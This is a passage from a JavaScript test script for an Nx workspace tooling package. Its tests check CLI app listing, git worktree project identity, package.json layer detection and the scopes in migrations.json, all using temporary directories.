  // invert which tree gets labelled. The sentinel is ctx.project — the name the engine resolved from git.
  const got = render(plan({ ...ctxFor(FIXTURES['angular web app with firebase and a design system']()), project: 'backitup' }, STAMP));
  ok(got.includes('worktree-tab-label --project=shop --workspaceName=backitup'), `got ${got.find((l) => l.startsWith('worktree-tab-label')) ?? '(no step)'}`);
});

check('cli.js apps: the apps .bespunky/dev.json declares outrank the graph\'s guess (several untagged applications)', (ok) => {
  // The shape that made inference decline in a real project: a client app beside a Windows service, an HTTP API
  // and a fixture tool — all applications, none tagged server-side. The project declares the one it serves.
  const shaped = (declaration) => {
    const tree = createTreeWithEmptyWorkspace();
    for (const name of ['daemon', 'issuance-service', 'ui']) addProjectConfiguration(tree, name, { root: `packages/${name}`, projectType: 'application', targets: {} });
    addProjectConfiguration(tree, 'linux-fixtures', { root: 'tools/linux-fixtures', projectType: 'application', targets: {} });
    if (declaration) writeJson(tree, '.bespunky/dev.json', declaration);
    return tree;
  };
  const apps = (tree) => {
    const dir = flush(tree);
    try {
      return execFileSync(process.execPath, [join(BUILD, 'src/layers/cli.js'), 'apps'], { cwd: dir }).toString();
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };
  const process_ = { id: 'app', cmd: 'x' };
  ok(apps(shaped({ apps: { ui: { processes: [process_] } } })) === 'ui\tpackages/ui\n', 'declared: only ui');
  const all = 'daemon\tpackages/daemon\nissuance-service\tpackages/issuance-service\nlinux-fixtures\ttools/linux-fixtures\nui\tpackages/ui\n';
  ok(apps(shaped(null)) === all, 'undeclared: the graph\'s candidates, unchanged');
  ok(apps(shaped({ apps: { docs: { processes: [process_] } } })) === all, 'a declaration naming no Nx app leaves the graph\'s answer standing');
});

check('workspace identity: the generators\' default and the engine\'s _project_identity agree — the main worktree\'s name', (ok) => {
  const { workspaceIdentity } = require_(join(BUILD, 'src/generators/_utils/workspace-identity'));
  const tmp = mkdtempSync(join(tmpdir(), 'layers-identity-'));
  const git = (...args) => execFileSync('git', args, { stdio: 'ignore', env: { ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t' } });
  try {
    const repo = join(tmp, 'backitup');
    mkdirSync(join(repo, 'web'), { recursive: true });
    writeFileSync(join(repo, 'web', 'nx.json'), '{}');
    git('-C', repo, 'init', '-q', '-b', 'main');
    git('-C', repo, 'add', '-A');
    git('-C', repo, 'commit', '-qm', 'init');
    const wt = join(tmp, 'worktrees', 'house-upgrade-2026-10-05');
    git('-C', repo, 'worktree', 'add', '-q', '-b', 'chore/house-upgrade-2026-10-05', wt);
    const plain = join(tmp, 'plain-dir');
    mkdirSync(plain);
    const house = readFileSync(join(ASSETS, 'house.sh'), 'utf8');
    const fn = house.slice(house.indexOf('_project_identity() {'), house.indexOf('\n}\n', house.indexOf('_project_identity() {')) + 3);
    for (const [label, dir, want] of [['the main worktree', repo, 'backitup'], ['a linked worktree', wt, 'backitup'], ['a subdirectory workspace (linked)', join(wt, 'web'), 'web'], ['a directory outside git', plain, 'plain-dir']]) {
      const ts = workspaceIdentity({ root: dir });
      const sh = execFileSync('bash', ['-c', `${fn}\n_project_identity "$1"`, '_', dir]).toString().trim();
      ok(ts === want && sh === want, `${label}: want ${want}, generators ${ts}, engine ${sh}`);
    }
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

check('cli.js apps: no nx.json, no apps (a repo the floor has not reached)', (ok) => {
  const dir = mkdtempSync(join(tmpdir(), 'layers-apps-'));
  try {
    ok(execFileSync(process.execPath, [join(BUILD, 'src/layers/cli.js'), 'apps'], { cwd: dir }).toString() === '', 'printed apps');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

check('evidence: a workspace MEMBER\'s package.json is a project file (registry and shell agree); a non-member\'s is not', (ok) => {
  const tree = tsSolution();
  // A package.json project declaring its dev-server in its `nx` block — web evidence, visible only in that file.
  writeJson(tree, 'packages/site/package.json', { name: '@acme/site', nx: { targets: { 'dev-server': { command: 'vite' } } } });
  const exact = registry.detectLayers(tree);
  ok(exact.includes('web'), `the registry misses the member's dev-server: ${exact}`);
  const dir = flush(tree);
  try {
    execFileSync('git', ['init', '-q', dir]);
    const shell = shellEvident(dir);
    ok(shell.split(',').includes('web'), `the shell evaluator misses a member package.json: ${shell}`);
    ok(shell.split(',').every((id) => exact.includes(id)), `the shell over-reports: ${shell} vs ${exact}`);
    // The same manifest OUTSIDE every workspaces glob is no project — neither Nx nor the hook may read it.
    mkdirSync(join(dir, 'stray/site'), { recursive: true });
    writeFileSync(join(dir, 'stray/site/package.json'), JSON.stringify({ name: 'stray', nx: { targets: { 'dev-server': { command: 'x' } } } }));
    rmSync(join(dir, 'packages/site'), { recursive: true, force: true });
    const stray = shellEvident(dir);
    ok(!stray.split(',').includes('web'), `a non-member package.json was read: ${stray}`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

check('the js layer on a TS-solution workspace: an inferred library is evidence, no @nx/js dependency or executor needed', (ok) => {
  const tree = tsSolution();
  ok(!registry.detectLayers(tree).includes('js'), `js without any library: ${registry.detectLayers(tree)}`);
  writeJson(tree, 'packages/lib/package.json', { name: '@acme/lib' });
  writeJson(tree, 'packages/lib/tsconfig.lib.json', {});
  ok(registry.detectLayers(tree).includes('js'), `an @nx/js/typescript library is not js evidence: ${registry.detectLayers(tree)}`);
});

// ── migrations.json: every rung names a registered layer scope ─────────────────────────────────────────────
console.log('\nmigration scopes');
check('every migrations.json entry declares a registered `layer`', (ok) => {
  const { generators } = JSON.parse(readFileSync(join(PAYLOAD, 'migrations.json'), 'utf8'));
  const ids = new Set(registry.LAYERS.map((l) => l.id));
  for (const [name, entry] of Object.entries(generators)) ok(ids.has(entry.layer), `${name}: layer ${entry.layer}`);
});

payload.dispose();
console.log(`\n${failed === 0 ? 'ok' : 'FAILED'}: ${passed} passed, ${failed} failed${write ? ' (layers.sh regenerated)' : ''}`);
process.exit(failed === 0 ? 0 : 1);
